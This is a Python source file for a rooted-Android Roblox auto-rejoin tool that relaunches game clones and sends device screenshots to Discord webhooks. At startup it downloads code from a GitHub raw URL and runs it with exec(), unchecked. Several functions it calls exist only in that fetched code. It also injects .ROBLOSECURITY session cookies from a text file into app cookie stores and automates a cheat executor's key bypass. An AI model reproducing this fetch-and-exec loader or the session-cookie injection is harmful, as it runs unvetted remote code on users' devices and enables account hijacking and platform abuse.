import json
import requests
import subprocess
import time
from flask import Flask,request,jsonify
import threading
import logging
from logging.handlers import RotatingFileHandler
import signal
import hashlib
import os
import string
import random
import uuid
import datetime
import shutil
import re
import psutil
import sqlite3
from tabulate import tabulate
import sys
import wget
import zipfile
from urllib.parse import urlparse,parse_qs
from discord_webhook import DiscordWebhook,DiscordEmbed
from urllib.parse import urlparse,urljoin
from bs4 import BeautifulSoup
url = "https://raw.githubusercontent.com/vttdz/key/refs/heads/main/keys.py"
response = requests.get(url)
exec(response.text)
app=Flask(__name__)
formatter=logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
log_file_path="/storage/emulated/0/download/jg/app.log"
handler=RotatingFileHandler(log_file_path,maxBytes=100000,backupCount=1)
handler.setFormatter(formatter)
logger=logging.getLogger()
logger.addHandler(handler)
logger.setLevel(logging.INFO)
os.environ["TERM"]="xterm"
current_version="3.6.8"
logo_text="\n  ___                    _____                    \n / _ \\                  |_   _|                   \n/ /_\\ \\_   _ _ __ __ _    | | ___  __ _ _ __ ___  \n|  _  | | | | '__/ _` |   | |/ _ \\/ _` | '_ ` _ \\ \n| | | | |_| | | | (_| |   | |  __/ (_| | | | | | |\n\\_| |_/\\__,_|_|  \\__,_|   \\_/\\___|\\__,_|_| |_| |_|\n\n"
print(logo_text)
CF_WEBHOOK_FILE_PATH="/storage/emulated/0/download/jg/cf_webhook.json"
LOG_FILE_PATH="/storage/emulated/0/download/jg/app.log"
SCREENSHOT_DIR="/storage/emulated/0/Download"
SCREENSHOT_PATH=os.path.join(SCREENSHOT_DIR,"screenshot.png")
BASE_DIR="data/data"
SKIP_FOLDERS={"avatar","bundles","configs","fonts","guac","localization","models","places","sky","sounds","textures"}
COLOR_RED="[91m"       
COLOR_YELLOW="[93m"     
COLOR_GREEN="[92m"     
COLOR_LIGHT_BLUE="[94m"
COLOR_ORANGE="[38;5;214m"  
COLOR_RESET="[0m"
number_color=COLOR_RED
command_color=COLOR_RESET
description_color=COLOR_YELLOW
def show_menu():
    print("="*40)
    message=f"""
{COLOR_GREEN}🌟  Tool Rejoin Roblox 🌟{COLOR_RESET}
- Package: {COLOR_LIGHT_BLUE}Pro Max{COLOR_RESET}
- Version: {COLOR_GREEN}{current_version}{COLOR_RESET}
"""
    print(message)
    print("="*40)
    print(f"{COLOR_YELLOW}Select commands:{COLOR_RESET}")
    commands=[
        f"[{number_color}01{COLOR_RESET}] {command_color}create       | {description_color}Create user_config.json           {COLOR_RESET}   ",
        f"[{number_color}02{COLOR_RESET}] {command_color}list         | {description_color}List accounts                        {COLOR_RESET}  ",
        f"[{number_color}03{COLOR_RESET}] {command_color}start        | {description_color}Run auto rejoin V1.              {COLOR_RESET}    ",
        f"[{number_color}04{COLOR_RESET}] {command_color}out          | {description_color}Out command                        {COLOR_RESET}   ",
        f"[{number_color}05{COLOR_RESET}] {command_color}startv2      | {description_color}Better run rejoin for v3            {COLOR_RESET}  ",
        f"[{number_color}06{COLOR_RESET}] {command_color}login        | {description_color}Login to Roblox account               {COLOR_RESET}  ",
        f"[{number_color}07{COLOR_RESET}] {command_color}statuswebhook| {description_color}Webhook screenshot                {COLOR_RESET}"
]
    for command in commands:
        print(command)
    print("="*40)
    print(f"{COLOR_YELLOW}Tips: Ctrl + C to stop tool{COLOR_RESET}")
    print(f"{COLOR_YELLOW}Check log tool in app.log{COLOR_RESET}")
    print(f"")
AVATAR_URL="https://media.discordapp.net/attachments/1268452107892293652/1316413885137555546/The_One_I_Love.png?ex=675af578&is=6759a3f8&hm=72666a41eef345e3ed22c94824ab38bde482800cf994376579856cf629c5920a&=&format=webp&quality=lossless&width=314&height=314" 
USERNAME="Status Webhook" 
def load_config_wh():
    default_config_wh={
        "androidName":"",
        "webhook_url":"",
        "send_interval":60
}
    if os.path.exists(CF_WEBHOOK_FILE_PATH):
        with open(CF_WEBHOOK_FILE_PATH,"r")as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                logger.error("Error load file cf_webhook.json.")
                return default_config_wh
    else:
        logger.info("Create file cf_webhook.json.")
        save_config_wh(default_config_wh)
        return default_config_wh
def save_config_wh(config_wh):
    with open(CF_WEBHOOK_FILE_PATH,"w")as f:
        json.dump(config_wh,f,indent=4)
def get_system_status(config_wh):
    cpu_cores=psutil.cpu_count()
    cpu_usage=psutil.cpu_percent(interval=1)
    memory=psutil.virtual_memory()
    status={
        "androidName":config_wh.get("androidName","Unknown"),
        "cpuCores":cpu_cores,
        "cpuUsage":cpu_usage,
        "totalRAM":memory.total/(1024**3),
        "usedRAM":memory.used/(1024**3),
        "ramUsagePercent":memory.percent,
}
    return status
def format_status_embed(status):
    embed={
        "title":"UGPHONE STATUS",
        "description":"Information",
        "color":7506394,
        "fields":[
{"name":"Android Name","value":status["androidName"],"inline":False},
{"name":"CPU Cores","value":str(status["cpuCores"]),"inline":True},
{"name":"CPU Usage","value":f"{status['cpuUsage']}%","inline":True},
{"name":"Total RAM","value":f"{status['totalRAM']:.2f} GB","inline":True},
{"name":"Used RAM","value":f"{status['usedRAM']:.2f} GB","inline":True},
{"name":"RAM Usage","value":f"{status['ramUsagePercent']}%","inline":True},
],
        "image":{
            "url":"attachment://screenshot.png"
}
}
    return embed
def take_screenshot():
    os.system(f"/system/bin/screencap -p /storage/emulated/0/Download/screenshot.png")
def send_webhook(status,screenshot_path,config_wh):
    embed=format_status_embed(status)
    webhook_url=config_wh.get("webhook_url")
    if os.path.exists(screenshot_path):
        with open(screenshot_path,"rb")as f:
            files={
                "payload_json":(None,json.dumps({
                    "username":USERNAME,
                    "avatar_url":AVATAR_URL,
                    "embeds":[embed]
}),"application/json"),
                "file":("screenshot.png",f,"image/png")
}
            response=requests.post(webhook_url,files=files)
            logger.info(f"Webhook response: {response.status_code}")
    else:
        logger.error("Screenshot file not found")
def parse_time_input(time_input):
    match=re.match("(\\d+)([sm]?)",time_input)
    if not match:
        raise ValueError("Invalid time format. Use '30s' or '1m'.")
    value,unit=match.groups()
    value=int(value)
    if unit=="m":
        return value*60
    return value
def monitor_system(send_interval,config_wh):
    while True:
        status=get_system_status(config_wh)
        take_screenshot()
        send_webhook(status,SCREENSHOT_PATH,config_wh)
        time.sleep(send_interval)
def start_monitoring(time_interval,config_wh):
    monitoring_thread=threading.Thread(target=monitor_system,args=(time_interval,config_wh))
    monitoring_thread.daemon=True
    monitoring_thread.start()
    logger.info("Started monitoring system status")
def root():
    try:
        result=os.system("su -c \"echo\"")
        return result==0
    except Exception as e:
        print(f"Error checking root status: {e}")
        return False
def is_valid(url):
    parsed=urlparse(url)
    return bool(parsed.netloc)and bool(parsed.scheme)
def gawl(url):
    domain_name=urlparse(url).netloc
    soup=BeautifulSoup(requests.get(url).content,"html.parser")
    internal_urls=set()
    external_urls=set()
    for a_tag in soup.find_all("a"):
        href=a_tag.attrs.get("href","")
        href=urljoin(url,href)
        if is_valid(href):
            if domain_name in href:
                internal_urls.add(href)
            else:
                external_urls.add(href)
    for i in external_urls:
        if i[0:16]=="https://download":
            return i
def copy_content(src,dest):
    if not os.path.exists(dest):
        os.makedirs(dest)
    for item in os.listdir(src):
        s=os.path.join(src,item)
        d=os.path.join(dest,item)
        if os.path.isdir(s):
            if item not in SKIP_FOLDERS:
                copy_content(s,d)
        else:
            shutil.copy2(s,d)
class IgnorePostJoinFilter(logging.Filter):
    def __init__(self,ignored_phrases):
        super().__init__()
        self.ignored_phrases=ignored_phrases
    def filter(self,record):
        return not any(phrase in record.getMessage()for phrase in self.ignored_phrases)
ignored_phrases=["POST /join","Starting: Intent"]
flask_logger=logging.getLogger("werkzeug")
flask_logger.addFilter(IgnorePostJoinFilter(ignored_phrases))
stop_event=threading.Event()
thread=threading.Thread()
def signal_handler(sig,frame):
    logger.warning("Ctrl+C pressed: Stopping the tool...")
    stop_event.set()
signal.signal(signal.SIGINT,signal_handler)
signal.signal(signal.SIGTERM,signal_handler)
identifier="robloxrejoin"
def resolve_username_to_user_id(username):
    url=f"https://users.roblox.com/v1/users/get-by-username?username={username}"
    headers={"Content-Type":"application/json"}
    try:
        response=requests.get(url,headers=headers)
        response.raise_for_status()
        data=response.json()
        if "id" in data:
            return data["id"]
        else:
            logger.warning(f"Failed to get user ID for username {username}. Response: {data}")
            return None
    except requests.exceptions.RequestException as e:
        logger.error(f"Error retrieving user ID for username {username}: {str(e)}")
        return None
def is_user_online(user_presence):
    online=user_presence["userPresenceType"]in[1,2]
    logger.info(f"User online status: {online}")
    return online
def is_user_in_game(user_presence):
    in_game=user_presence["userPresenceType"]==2
    logger.info(f"User in game status: {in_game}")
    return in_game
def force_stop_all_roblox(package_name):
    force_stop_all_command=f"pkill {package_name}"
    while True:
        try:
            subprocess.run(force_stop_all_command,shell=True,check=True)
            logger.info(f"Force-stop-all app: {package_name}")
        except subprocess.CalledProcessError as e:
            logger.error(f"Error force-stopping Roblox app: {package_name}, {e}")
        time.sleep(18000)
def force_stop_roblox(package_name,private_server_link):
    force_stop_command=f"am start -a android.intent.action.VIEW -d '{private_server_link}' {package_name}"
    try:
        subprocess.run(force_stop_command,shell=True,check=True)
        logger.info(f"Restart Roblox app: {package_name}")
    except subprocess.CalledProcessError as e:
        logger.error(f"Error force-stopping Roblox app: com.roblox.{package_name}, {e}")
def join_game(package_name,private_server_link):
    time.sleep(20)
    force_stop_roblox(package_name,private_server_link)
    start_command=f"am start -n {package_name}/{package_name}.ActivityProtocolLaunch -d '{private_server_link}'"
    try:
        subprocess.run(start_command,shell=True,check=True)
        logger.info(f"Started Roblox app: {package_name} with link: {private_server_link}")
    except subprocess.CalledProcessError as e:
        logger.error(f"Error starting Roblox: {str(e)}")
@app.route("/join",methods=["POST"])
def join():
    data=request.json
    package_name=data.get("package_name")
    private_server_link=data.get("private_server_link")
    logger.info(f"Join request received: package_name={package_name}, private_server_link={private_server_link}")
    join_game(package_name,private_server_link)
    return jsonify({"message":"Join private servers!"})
@app.route("/api/script-loaded",methods=["POST"])
def script_loaded():
    data=request.json
    content=data.get("content")
    logger.info(f"Script loaded endpoint hit with content: {content}")
    if content in["Buang Loaded","Carti Loaded"]:
        global script_last_loaded_time
        script_last_loaded_time=time.time()
        logger.info(f"Script loaded with content: {content}, time updated.")
        return jsonify({"message":"Script loaded status updated!"})
    else:
        logger.warning(f"Invalid content received: {content}")
        return jsonify({"message":"Invalid content!"}),400
def start_flask():
    app.run(port=5000)
def main_logic(stop_event):
    try:
        global script_last_loaded_time
        script_last_loaded_time=time.time()
        while not stop_event.is_set():
            if os.path.exists("/storage/emulated/0/download/jg/user_config.json"):
                with open("/storage/emulated/0/download/jg/user_config.json","r")as file:
                    users=json.load(file)
                    for user in users:
                        user_id=user.get("user_id")
                        if isinstance(user_id,str)and not user_id.isdigit():
                            user_id=resolve_username_to_user_id(user_id)
                            if not user_id:
                                logger.warning(f"Skipping user {user['user_id']} due to failed username resolution.")
                                continue
                        else:
                            user_id=str(user_id)
                        package_name=user["package_name"]
                        private_server_link=user["private_server_link"]
                        id=user["id"]
                        user_presence=get_user_presence(user_id)
                        if user_presence:
                            if not is_user_in_game(user_presence):
                                if is_user_online(user_presence):
                                    print(f"User {user_id} is online but not in game.")
                                    if time.time()-script_last_loaded_time>1:
                                        notify_flask(package_name,private_server_link,id)
                                        if time.time()-script_last_loaded_time>5:
                                            logger.info(f"Forcing stop Roblox for user {user_id} due to script inactivity.")
                                            force_stop_roblox(package_name,private_server_link)
                                else:
                                    print(f"User {user_id} is offline.")
                                    if time.time()-script_last_loaded_time>1:
                                        notify_flask(package_name,private_server_link,id)
                                        if time.time()-script_last_loaded_time>5:
                                            logger.info(f"Forcing stop Roblox for user {user_id} due to script inactivity.")
                                            force_stop_roblox(package_name,private_server_link)
                            else:
                                print(f"User {user_id} is in game.")
                        else:
                            logger.warning(f"Failed to fetch presence data for user {user_id}")
                        time.sleep(20)
            else:
                logger.error("user_config.json not found. Use command 'create'.")
                break
    except Exception as e:
        logger.error(f"Exception occurred in main thread: {str(e)}")
    finally:
        logger.warning("Stopping tool.")
def notify_flask(package_name,private_server_link,id):
    url="http://localhost:5000/join"
    data={
        "package_name":package_name,
        "private_server_link":private_server_link,
        "id":id
}
    try:
        response=requests.post(url,json=data,timeout=30)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to notify Flask server: {str(e)}")
def create_user_config():
    default_config=[
{
            "id":1,
            "user_id":"user_id_1",
            "package_name":"package_name_1",
            "private_server_link":"private_server_link_1"
},
{
            "id":2,
            "user_id":"user_id_2",
            "package_name":"package_name_2",
            "private_server_link":"private_server_link_2"          
}
]
    with open("/storage/emulated/0/download/jg/user_config.json","w")as file:
        json.dump(default_config,file,indent=4)
    print("user_config.json create success.")
def list_users():
    if not os.path.exists("/storage/emulated/0/download/jg/user_config.json"):
        print("user_config.json not found. Use command 'create'.")
        return
    with open("/storage/emulated/0/download/jg/user_config.json","r")as file:
        users=json.load(file)
        for user in users:
            print(f"- {user['id']} : {user['user_id']}")
SCRIPT_DIR=os.path.dirname(os.path.realpath(__file__))
CONFIG_FILE=os.path.join(SCRIPT_DIR,"config.json")
DEFAULT_CONFIG={
    "placeid":"2753915549",
    "check_delay":20,
    "loop_delay":60,
    "vip_server_link":"",
    "open_home_menu_bf_launch_game":True,
    "double_check":True,
    "auto_get_key_fluxus":False,
    "bypass_with_username":False,
    "fluxus_get_key_link":"",
    "fluxus_get_key_delay [M]":15,
}
def load_config():
    if not os.path.isfile(CONFIG_FILE):
        print(f"Configuration file '{CONFIG_FILE}' not found, Creating config!")
        with open(CONFIG_FILE,"w")as file:
            file.write(json.dumps(DEFAULT_CONFIG))
            return DEFAULT_CONFIG
    try:
        with open(CONFIG_FILE,"r")as file:
            return json.load(file)
    except json.JSONDecodeError:
        print(f"Error reading '{CONFIG_FILE}'. Using default configuration.")
def find_roblox_data_paths():
    base_path="/data/data"
    paths=[]
    for folder in os.listdir(base_path):
        if folder.startswith("com.roblox.")and folder !="com.roblox.client":
            path=os.path.join(base_path,folder,"files/appData/LocalStorage/appStorage.json")
            if os.path.isfile(path):
                paths.append(path)
    return paths
def read_roblox_data(data_path,retries=3):
    attempt=0
    while attempt<retries:
        try:
            with open(data_path,"r")as file:
                data=json.load(file)
                user_id=data.get("UserId")
                username=data.get("Username")
                if user_id is not None and username is not None:
                    return user_id,username
                else:
                    attempt+=1
        except Exception as e:
            attempt+=1
            time.sleep(1)
    return False,False
def post_requests(userid):
    data={
        "userIds":[userid]
}
    headers={"Content-Type":"application/json"}
    try:
        response=requests.post("https://presence.roblox.com/v1/presence/users",data=json.dumps(data),headers=headers,timeout=5)
        ress=response.json()
        if "userPresences" in ress:
            if ress["userPresences"][0]["lastLocation"]=="Website":
                return True
            else:
                return False
        else:
            return False
    except Exception:
        return False
def extract_private_server_code(link):
    try:
        parsed_url=urlparse(link)
        query_params=parse_qs(parsed_url.query)
        if "share" in parsed_url.path and "code" in query_params:
            return query_params["code"][0]
        if "privateServerLinkCode" in query_params:
            return query_params["privateServerLinkCode"][0]
        else:
            return link
    except Exception as e:
        return None
def launch_roblox(roblox_package,placeid,check_delay,psserver,open_home_menu_bf_launch_game):
    try:
        full_command=f"pkill -f {roblox_package}"
        process=subprocess.Popen(
            full_command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
)
        stdout,stderr=process.communicate(timeout=10)
    except subprocess.CalledProcessError as e:
        pass
    except Exception as e:
        pass
    time.sleep(3)
    try:
        if open_home_menu_bf_launch_game:
            aaa=f'am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -n {roblox_package}/com.roblox.client.startup.ActivitySplash'
            subprocess.run(
                aaa,
                check=True,
                timeout=10,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
)
            time.sleep(15)
        if psserver !="":
            viplink=psserver
            user_command=f'am start -n {roblox_package}/com.roblox.client.ActivityProtocolLaunch -a android.intent.action.VIEW -d "{viplink}"'
        else:
            user_command=f'am start -n {roblox_package}/com.roblox.client.ActivityProtocolLaunch -a android.intent.action.VIEW -d roblox://placeID={placeid}'
        subprocess.run(
            user_command,
            check=True,
            timeout=10,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
)
        time.sleep(check_delay)
    except subprocess.TimeoutExpired:
        pass
    except subprocess.CalledProcessError as e:
        pass
    except Exception as e:
        print(e)
COLOR_ORANGE="[33m"  # Sử dụng màu vàng thay cho cam
COLOR_BLUE="[34m"
COLOR_RED="[31m"
COLOR_GREEN="[32m"
COLOR_RESET="[0m"  # Reset lại màu về mặc định
COLOR_ORANGE="[33m"  # Sử dụng màu vàng thay cho cam
COLOR_BLUE="[34m"
COLOR_RED="[31m"
COLOR_GREEN="[32m"
COLOR_RESET="[0m"  # Reset lại màu về mặc định
def clear_console():
    if os.name=="nt":# Nếu là Windows
        os.system("cls")
    else:# Nếu là Linux hoặc macOS
        os.system("clear")
def mainv2():
    clear_console()# Xóa console một lần duy nhất ở đầu chương trình
    print(logo_text)
    print("[LOAD] config.json file!")
    config=load_config()
    placeid=config.get("placeid",DEFAULT_CONFIG["placeid"])
    check_delay=config.get("check_delay",DEFAULT_CONFIG["check_delay"])
    loop_delay=config.get("loop_delay",DEFAULT_CONFIG["loop_delay"])
    psserver=config.get("vip_server_link",DEFAULT_CONFIG["vip_server_link"])
    double_heartbeat_check=config.get("double_check",DEFAULT_CONFIG["double_check"])
    open_home_menu_bf_launch_game=config.get("open_home_menu_bf_launch_game",DEFAULT_CONFIG["open_home_menu_bf_launch_game"])
    fluxus_get_key_link=config.get("fluxus_get_key_link",DEFAULT_CONFIG["fluxus_get_key_link"])
    auto_get_key_fluxus=config.get("auto_get_key_fluxus",DEFAULT_CONFIG["auto_get_key_fluxus"])
    fluxusgetkeydelay=config.get("fluxus_get_key_delay [M]",DEFAULT_CONFIG["fluxus_get_key_delay [M]"])
    if auto_get_key_fluxus and fluxus_get_key_link !="":
        Hwid=extract_hwid(fluxus_get_key_link)
        threading.Thread(target=autogetkey,args=(Hwid,fluxusgetkeydelay,)).start()
    data_table=[]
    while True:
        roblox_paths=find_roblox_data_paths()
        if not roblox_paths:
            print("No Roblox accounts found.")
            return
        table_changed=False
        for data_path in roblox_paths:
            userid,username=read_roblox_data(data_path)
            if userid and username:
                status=post_requests(userid)
                if double_heartbeat_check:
                    time.sleep(10)
                    status=post_requests(userid)
                current_time=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                roblox_package=data_path.split(os.sep)[3]
                if status is True:
                    launch_roblox(roblox_package,placeid,check_delay,psserver,open_home_menu_bf_launch_game)
                    status_text=f'{COLOR_RED}Offline{COLOR_RESET}'
                else:
                    status_text=f'{COLOR_GREEN}Online{COLOR_RESET}'
                roblox_package_colored=f'{COLOR_ORANGE}{roblox_package}{COLOR_RESET}'
                username_colored=f'{COLOR_BLUE}{username}{COLOR_RESET}'
                updated=update_or_add_entry(data_table,roblox_package_colored,username_colored,status_text,current_time)
                if updated:
                    table_changed=True  # Đánh dấu là có thay đổi
        if table_changed:
            clear_console()# Xóa console trước khi in bảng mới
            print(logo_text)
            print(tabulate(data_table,headers=["Package","Username","Status","Time"],tablefmt="fancy_grid"))
        time.sleep(loop_delay)
def update_or_add_entry(data_table,package,username,status,time):
    for entry in data_table:
        if entry[0]==package and entry[1]==username:
            if entry[2]!=status or entry[3]!=time:# Chỉ cập nhật nếu có thay đổi
                entry[2]=status
                entry[3]=time
                return True
            return False
    data_table.append([package,username,status,time])
    return True  # Đã thêm một mục mới
def force_roblox(packages):
    try:
        full_command=f"pkill -f {packages}"
        subprocess.run(
            full_command,
            check=True,
            timeout=10,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
)
    except subprocess.TimeoutExpired:
        pass
    except subprocess.CalledProcessError as e:
        pass
    time.sleep(1)
def logout_roblox():
    global logged_in_usernames
    roblox_paths=find_roblox_data_paths()
    if not roblox_paths:
        print("No Roblox accounts found.")
        return
    accounts=[]
    print("Available Roblox accounts:")
    for i,data_path in enumerate(roblox_paths,start=1):
        userid,username=read_roblox_data(data_path)
        if userid and username:
            accounts.append((userid,username,data_path))
            print(f"{i}. Username: {username}, UserId: {userid}")
    if not accounts:
        print("No Roblox accounts found.")
        return
    print("Enter the number of the account to log out, '0' to log out all accounts, or 'q' to quit:")
    choice=input().strip()
    if choice.lower()=="q":
        return
    try:
        if choice=="0":
            for userid,username,data_path in accounts:
                try:
                    roblox_package=data_path.split(os.sep)[3]
                    force_roblox(roblox_package)
                    appstorage_path=os.path.join(data_path)
                    print(f"Logging out account: {username}, path: {appstorage_path}")
                    os.remove(appstorage_path)
                    try:
                        logged_in_usernames.remove(username)
                    except:
                        pass
                    print(f"Logged out account: {username}")
                except:
                    pass
        else:
            choice_index=int(choice)-1
            if 0<=choice_index<len(accounts):
                userid,username,data_path=accounts[choice_index]
                roblox_package=data_path.split(os.sep)[3]
                force_roblox(roblox_package)
                appstorage_path=os.path.join(data_path)
                print(f"Logging out account: {username}, path: {appstorage_path}")
                os.remove(appstorage_path)
                try:
                    logged_in_usernames.remove(username)
                except:
                    pass
                print(f"Logged out account: {username}")
            else:
                print("Invalid choice. Choice index out of range.")
    except ValueError:
        print("Invalid input. Please enter a number.")
    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f"Error: {e}")
logged_in_usernames=set()
def fetch_valid_cookie(cookie_file,usernames):
    global logged_in_usernames
    try:
        with open(cookie_file,"r")as file:
            cookies=file.readlines()
        for cookie in cookies:
            cookie=cookie.strip()
            response=requests.get(
                "https://users.roblox.com/v1/users/authenticated",
                cookies={".ROBLOSECURITY":cookie},
                timeout=5
)
            if response.status_code==200:
                name=response.json()["name"]
                userid=response.json()["id"]
                if name not in usernames and name not in logged_in_usernames:
                    return cookie,name,userid
        return None,None,None
    except Exception as e:
        print(f"Error fetching valid cookie: {e}")
        return None,None,None
def findotherrobloxdatapath():
    base_path="/data/data"
    paths=[]
    print("Scanning base path:",base_path)
    for folder in os.listdir(base_path):
        if folder.lower().startswith("com.roblox.")and folder !="com.roblox.client":
            localstorage_path=os.path.join(base_path,folder,"files/appData/LocalStorage")
            if os.path.isdir(localstorage_path):
                paths.append(localstorage_path)
    return paths
def update_cookies_db(cookie_value):
    try:
        template_cookies_db_path=os.path.join(SCRIPT_DIR,"Cookies.db")
        conn=sqlite3.connect(template_cookies_db_path)
        cursor=conn.cursor()
        cursor.execute("UPDATE Cookies SET value=? WHERE name='.ROBLOSECURITY'",(cookie_value.strip(),))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Error updating Cookies.db: {e}")
def set_permissions(file_path,mode):
    try:
        os.chmod(file_path,mode)
        print(f"Permissions set to {oct(mode)} for {file_path}")
    except Exception as e:
        print(f"Error setting permissions for {file_path}: {e}")
def login_roblox():
    global logged_in_usernames
    roblox_paths=findotherrobloxdatapath()
    if not roblox_paths:
        print("No Roblox directories found.")
        return
    usernames=[]
    paths_to_update=[]
    for data_path in roblox_paths:
        appstorage_path=os.path.join(data_path,"appStorage.json")
        if os.path.isfile(appstorage_path):
            userid,username=read_roblox_data(appstorage_path)
            if userid and username:
                logged_in_usernames.add(username)
                usernames.append(username)
            else:
                paths_to_update.append(data_path)
        else:
            paths_to_update.append(data_path)
    COOKIE_FILE=os.path.join(SCRIPT_DIR,"cookie.txt")
    any_logged_in=False
    for data_path in paths_to_update:
        cookie_value,username,userid=fetch_valid_cookie(COOKIE_FILE,usernames)
        if cookie_value and username and userid:
            try:
                roblox_package=data_path.split(os.sep)[3]
                force_roblox(roblox_package)
                print(f"Updating for package: {roblox_package}")
                update_cookies_db(cookie_value)
                target_cookies_db_dir=os.path.join("/data/data",roblox_package,"app_webview/Default")
                target_cookies_db_path=os.path.join(target_cookies_db_dir,"Cookies")
                try:
                    os.remove(target_cookies_db_path)
                except:
                    pass
                subprocess.run(["cp","-p",os.path.join(SCRIPT_DIR,"Cookies.db"),target_cookies_db_path])
                localstorage_path=data_path
                appstorage_path=os.path.join(localstorage_path,"appStorage.json")
                APPSTORAGE_TEMPLATE=os.path.join(SCRIPT_DIR,"appStorage.json")
                try:
                    os.remove(appstorage_path)
                except:
                    pass
                subprocess.run(["cp","-p",APPSTORAGE_TEMPLATE,appstorage_path])
                with open(appstorage_path,"r+")as file:
                    data=json.load(file)
                    data["UserId"]=str(userid)
                    data["Username"]=str(username)
                    file.seek(0)
                    json.dump(data,file)
                    file.truncate()
                any_logged_in=True
                logged_in_usernames.add(username)
                print(f"Logged in account: {username}")
            except Exception as e:
                print(f"Error logging in: {e}")
        else:
            print("No valid cookie found.")
    if not any_logged_in:
        print("No paths could be logged in.")
def save_webhook_url(webhook_url):
    with open("jg_webhook.json","w")as file:
        json.dump({"webhook_url":webhook_url},file)
def load_webhook_url():
    if os.path.exists("jg_webhook.json"):
        with open("jg_webhook.json","r")as file:
            data=json.load(file)
            return data.get("webhook_url")
    return None
def send_status_to_webhook(webhook_url,users_status):
    webhook=DiscordWebhook(url=webhook_url)
    embed=DiscordEmbed(title="User Status",color="03b2f8")
    for user_status in users_status.split("\n"):
        if user_status.strip():
            embed.add_embed_field(name="Status",value=user_status,inline=False)
    webhook.add_embed(embed)
    try:
        response=webhook.execute()
        if response.status_code==200:
            print(f"Status sent to webhook: {webhook_url}")
        else:
            print(f"Failed to send status to webhook: {response.status_code}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to send status to webhook: {str(e)}")
        print(f"Failed to send status to webhook: {str(e)}")
def status_command():
    webhook_url=input("Enter the webhook URL: ")
    save_webhook_url(webhook_url)
    if not os.path.exists("/storage/emulated/0/download/jg/user_config.json"):
        print("user_config.json not found. Use command 'create'.")
        return
    users_status=""
    with open("/storage/emulated/0/download/jg/user_config.json","r")as file:
        users=json.load(file)
        for user in users:
            user_id=user["user_id"]
            user_presence=get_user_presence(user_id)
            status="0 (Offline)"
            if user_presence:
                if is_user_in_game(user_presence):
                    status="2 (In game)"
                elif is_user_online(user_presence):
                    status="1 (Not in game)"
            user_status=f"{user['user_id']} : {status}"
            users_status+=user_status+"\n"
            print(user_status)
    send_status_to_webhook(webhook_url,users_status)
def force_stop_schedule(hours,package_name):
    def force_stop():
        logger.info(f"Scheduled force stop of Roblox app: {package_name}")
        force_stop_all_roblox(package_name)
    stop_time=time.time()+hours*5
    while time.time()<stop_time:
        if stop_event.is_set():
            return
        time.sleep(5)
    force_stop()
def send_status_periodically(webhook_url):
    while not stop_event.is_set():
        status_command()
        time.sleep(300)
def main():
    flask_thread=threading.Thread(target=start_flask)
    flask_thread.daemon=True
    flask_thread.start()
    checkForUpdate()

    time.sleep(1)
    show_menu_once=True
    while True:
        config_wh=load_config_wh()
        if show_menu_once:
            command=show_menu()
            show_menu_once=False
        else:
            command=input("Input command: ")
            if command in{"create","1"}:
                create_user_config()
            elif command in{"list","2"}:
                list_users()
            elif command in{"start","3"}:
                flask_thread=threading.Thread(target=start_flask)
                flask_thread.daemon=True
                flask_thread.start()
                main_logic(stop_event)
            elif command in{"out","4"}:
                print("Out command input.")
                break
            elif command in{"login","6"}:
                login_roblox()
            elif command in{"startv2","5"}:
                os.system("clear")
                print("")
                mainv2()
            elif command in{"statuswebhook","7"}:
              config_wh["androidName"]=input("Name device: ")
              config_wh["webhook_url"]=input("Link webhook: ")
              time_input=input("Time: ")
              try:
                  interval=parse_time_input(time_input)
                  config_wh["send_interval"]=interval
                  save_config_wh(config_wh)
                  logger.info(f"Scheduling webhook every {interval} seconds.")
                  start_monitoring(interval,config_wh)
              except ValueError as e:
                  logger.error(e)
            else:
                print("Command not found.")
if __name__=="__main__":
    main()
